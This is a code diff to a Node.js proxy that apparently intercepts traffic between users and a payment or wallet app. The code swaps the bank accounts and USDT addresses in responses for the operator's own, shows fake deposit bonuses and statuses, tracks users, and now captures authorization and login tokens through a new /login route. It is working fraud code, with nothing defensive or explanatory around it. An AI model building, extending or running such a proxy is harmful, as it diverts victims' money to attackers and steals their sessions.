@@ -28,7 +28,13 @@ async function ensureWebhook() {
 
 const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, withdrawOverride: 0 };
 
-async function loadData() {
+let cachedData = null;
+let cacheTime = 0;
+const CACHE_TTL = 5000;
+const tokenUserMap = {};
+
+async function loadData(forceRefresh) {
+  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
   try {
     let data = await kv.get('bankData');
     if (data) {
@@ -39,10 +45,27 @@ async function loadData() {
       if (data.logRequests === undefined) data.logRequests = false;
       if (data.usdtAddress === undefined) data.usdtAddress = '';
       if (data.fakeWithdrawals) delete data.fakeWithdrawals;
+      cachedData = data;
+      cacheTime = Date.now();
       return data;
     }
   } catch (e) {}
-  return { ...DEFAULT_DATA, userOverrides: {}, trackedUsers: {} };
+  const d = { ...DEFAULT_DATA, userOverrides: {}, trackedUsers: {} };
+  cachedData = d;
+  cacheTime = Date.now();
+  return d;
+}
+
+function saveTokenUserId(req, userId) {
+  if (!userId) return;
+  const tok = req.headers['authorization'] || req.headers['token'] || '';
+  if (tok && tok.length > 10) tokenUserMap[tok] = userId;
+}
+
+function getUserIdFromToken(req) {
+  const tok = req.headers['authorization'] || req.headers['token'] || '';
+  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
+  return null;
 }
 
 async function trackUser(bankData, userId, info) {
@@ -57,7 +80,11 @@ async function trackUser(bankData, userId, info) {
 }
 
 async function saveData(data) {
-  try { await kv.set('bankData', JSON.stringify(data)); } catch (e) {}
+  try {
+    await kv.set('bankData', JSON.stringify(data));
+    cachedData = data;
+    cacheTime = Date.now();
+  } catch (e) {}
 }
 
 function getUserOverride(bankData, userId) {
@@ -113,6 +140,8 @@ function bankListText(d) {
 }
 
 function extractUserId(req, jsonResp) {
+  const fromToken = getUserIdFromToken(req);
+  if (fromToken) return fromToken;
   if (req.parsedBody && req.parsedBody.userId) return String(req.parsedBody.userId);
   const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
   if (qs.get('userId')) return String(qs.get('userId'));
@@ -204,11 +233,17 @@ async function transparentProxy(req, res) {
     let buf = Buffer.from(body);
 
     try {
+      let bodyStr = buf.toString('utf8');
+      let parsed = null;
+      try { parsed = JSON.parse(bodyStr); } catch(e) {}
+      if (parsed) {
+        const uid = extractUserId(req, parsed);
+        if (uid) saveTokenUserId(req, uid);
+      }
+
       const bankData = await loadData();
       if (bankData.usdtAddress) {
-        let bodyStr = buf.toString('utf8');
-        let jsonResp = null;
-        try { jsonResp = JSON.parse(bodyStr); } catch(e) {}
+        let jsonResp = parsed;
         if (jsonResp) {
           const result = replaceUsdtInResponse(jsonResp, bankData, req.path);
           if (result && result.oldAddr) {
@@ -1106,6 +1141,7 @@ async function proxyAndAddBonus(req, res) {
     const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
 
     if (detectedUserId) {
+      saveTokenUserId(req, detectedUserId);
       trackUser(bankData, detectedUserId, `App Open ${req.path}`);
       saveData(bankData).catch(() => {});
     }
@@ -1128,6 +1164,7 @@ async function proxyAndReplaceBankInList(req, res) {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
     const detectedUserId = extractUserId(req, jsonResp);
+    if (detectedUserId) saveTokenUserId(req, detectedUserId);
     const eff = getEffectiveSettings(bankData, detectedUserId);
     const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(bankData, detectedUserId) : null;
 
@@ -1331,6 +1368,20 @@ app.all('/user/cashFlow', async (req, res) => {
 
 app.post('/money/check/payStatus', async (req, res) => {
   await proxyAndReplaceBankInList(req, res);
+});
+
+app.post('/login', async (req, res) => {
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const uid = extractUserId(req, jsonResp);
+    if (uid) saveTokenUserId(req, uid);
+    if (uid && jsonResp && jsonResp.data && jsonResp.data.token) {
+      tokenUserMap[jsonResp.data.token] = uid;
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
+  }
 });
 
 app.all('/user/*', async (req, res) => {
